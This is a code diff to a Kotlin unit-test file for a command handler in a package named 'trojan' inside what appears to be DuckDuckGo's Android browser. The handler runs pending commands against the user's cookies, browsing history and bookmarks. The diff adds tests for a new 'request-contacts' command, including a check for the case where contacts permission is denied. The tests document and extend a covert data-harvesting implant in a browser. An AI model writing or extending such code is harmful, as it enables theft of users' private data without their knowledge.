@@ -1,5 +1,6 @@
 package com.duckduckgo.trojan.impl
 
+import android.content.Context
 import android.net.Uri
 import android.webkit.CookieManager
 import com.duckduckgo.common.test.CoroutineTestRule
@@ -21,6 +22,7 @@ import org.junit.runner.RunWith
 import org.mockito.kotlin.mock
 import org.mockito.kotlin.whenever
 import org.robolectric.RobolectricTestRunner
+import org.robolectric.RuntimeEnvironment
 import java.time.LocalDateTime
 
 @RunWith(RobolectricTestRunner::class)
@@ -33,15 +35,18 @@ class CommandHandlerTest {
     private val mockCookieManager: CookieManager = mock()
     private val mockNavigationHistory: NavigationHistory = mock()
     private val mockSavedSitesRepository: SavedSitesRepository = mock()
+    private lateinit var context: Context
 
     private lateinit var testee: RealCommandHandler
 
     @Before
     fun setUp() {
+        context = RuntimeEnvironment.getApplication()
         testee = RealCommandHandler(
             mockCookieManagerProvider,
             mockNavigationHistory,
             mockSavedSitesRepository,
+            context,
         )
     }
 
@@ -186,6 +191,49 @@ class CommandHandlerTest {
         val result = testee.execute(cmd)
 
         assertThat(result, `is`("no bookmarks"))
+    }
+
+    // -----------------------------------------------------------------------
+    // request-contacts
+    // -----------------------------------------------------------------------
+
+    @Test
+    fun whenRequestContactsWithNoContactsThenReturnsNoContacts() = runTest {
+        // Robolectric's ContentResolver returns empty cursor for contacts by default.
+        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
+        val result = testee.execute(cmd)
+
+        // Either "no contacts" or "no contacts available" are valid.
+        assertThat(result.contains("no contact", ignoreCase = true), `is`(true))
+    }
+
+    @Test
+    fun whenRequestContactsPermissionDeniedThenReturnsPermissionError() = runTest {
+        // Use a context whose ContentResolver throws SecurityException.
+        val restrictedContext = object : android.content.ContextWrapper(context) {
+            override fun getContentResolver(): android.content.ContentResolver {
+                return object : android.test.mock.MockContentResolver() {
+                    override fun query(
+                        uri: Uri,
+                        projection: Array<out String>?,
+                        selection: String?,
+                        selectionArgs: Array<out String>?,
+                        sortOrder: String?,
+                    ) = throw SecurityException("READ_CONTACTS denied")
+                }
+            }
+        }
+        val restrictedHandler = RealCommandHandler(
+            mockCookieManagerProvider,
+            mockNavigationHistory,
+            mockSavedSitesRepository,
+            restrictedContext,
+        )
+
+        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
+        val result = restrictedHandler.execute(cmd)
+
+        assertThat(result, containsString("permission denied"))
     }
 
     // -----------------------------------------------------------------------
